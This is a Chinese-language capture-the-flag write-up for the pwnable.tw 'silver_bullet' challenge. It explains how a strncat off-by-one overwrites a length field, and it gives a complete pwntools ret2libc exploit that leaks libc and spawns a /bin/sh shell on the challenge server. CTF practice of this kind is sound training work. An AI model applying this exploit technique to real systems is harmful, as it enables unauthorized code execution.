---
title: silver_bullet
description: pwnable | bof | ret2libc
---
<!--more-->

##题目考点

 - strncmp等危险函数导致的栈溢出
 - ret2libc

--------

##解题思路
  
  题目中给出了libc文件，先用patchelf搞定本地环境方便调试;
  checksec，发现是32位程序没开canary和PIE，进入ida分析:
  main()提供了操作菜单，且只有beat返回值非0(即赢得游戏)才能return，进行ROP:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v5; // [esp+0h] [ebp-3Ch]
  const char *v6; // [esp+4h] [ebp-38h]
  char s; // [esp+8h] [ebp-34h]
//关键数组
  int v8; // [esp+38h] [ebp-4h]
//关键变量

  init_proc();
  v8 = 0;
  memset(&s, 0, 0x30u);
  v5 = 0x7FFFFFFF;
  v6 = "Gin";
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          menu();
          v3 = read_int();
          if ( v3 != 2 )
            break;
          power_up(&s);
        }
        if ( v3 > 2 )
          break;
        if ( v3 != 1 )
          goto LABEL_16;
        create_bullet(&s);
      }
      if ( v3 == 3 )
        break;
      if ( v3 == 4 )
      {
        puts("Don't give up !");
        exit(0);
      }
LABEL_16:
      puts("Invalid choice");
    }
    if ( beat((int)&s, &v5) )
//只有beat()返回值非0才能跳出while循环进行return操作
      return 0;
    puts("Give me more power !!");
  }
}
```

  power_up()函数，发现危险函数:
```c
int __cdecl power_up(char *dest)
{
  char s; // [esp+0h] [ebp-34h]
  size_t v3; // [esp+30h] [ebp-4h]

  v3 = 0;
  memset(&s, 0, 0x30u);
  if ( !*dest )
    return puts("You need create the bullet first !");
  if ( *((_DWORD *)dest + 12) > 0x2Fu )
    return puts("You can't power up any more !");
  printf("Give me your another description of bullet :");
  read_input(&s, 48 - *((_DWORD *)dest + 12));
  strncat(dest, &s, 48 - *((_DWORD *)dest + 12));
//数组长度保存在buf[0x30]的位置，而数组的允许大小为0x30(不包括尾部的0x00)，因此可以通过strncat将buf[0x30]位置的整型变量覆写为0x00
  v3 = strlen(&s) + *((_DWORD *)dest + 12);
  printf("Your new power is : %u\n", v3);
  *((_DWORD *)dest + 12) = v3;
  return puts("Enjoy it !");
}
```

  根据上述分析，可以通过先creat再powerup实现改写ret地址，进而进行ret2libc操作:

```py
creat(b"a" * 0x2f)
power(b"a")
#payload1 = payload
power(payload1)
beat()
```

--------

##exploit

```py
from pwn import *

p = remote("chall.pwnable.tw", 10103)
#p = process("./silver_bullet")
e = ELF("./silver_bullet")
l = ELF("./libc_32.so.6")
context.log_level = 'debug'
#input()

def creat(data):
	p.recvuntil(b"Your choice :")
	p.send(b"1")
	p.recvuntil(b"Give me your description of bullet :")
	p.send(data)
def power(data):
	p.recvuntil(b"Your choice :")
	p.send(b"2")
	p.recvuntil(b"Give me your another description of bullet :")
	p.send(data)
def beat():
	p.recvuntil(b"Your choice :")
	p.send(b"3")

creat(b"a" * 0x2f)
power(b"a")
payload1 = p32(0xfffff111) + b'a' * 3 + p32(e.plt['puts']) + p32(e.symbols['main']) + p32(e.got['puts'])
power(payload1)
beat()
p.recvuntil(b"Oh ! You win !!\n")
libc_base = u32(p.recv(4)) - l.symbols['puts']
bins_addr = libc_base + next(l.search(b"/bin/sh"))
syst_addr = libc_base + l.symbols['system']

creat(b"a" * 0x2f)
power(b"a")
payload2 = p32(0xfffff111) + b'a' * 3 + p32(syst_addr) + p32(e.symbols['main']) + p32(bins_addr)
power(payload2)
beat()
p.recvuntil(b"Oh ! You win !!\n")

p.interactive()
```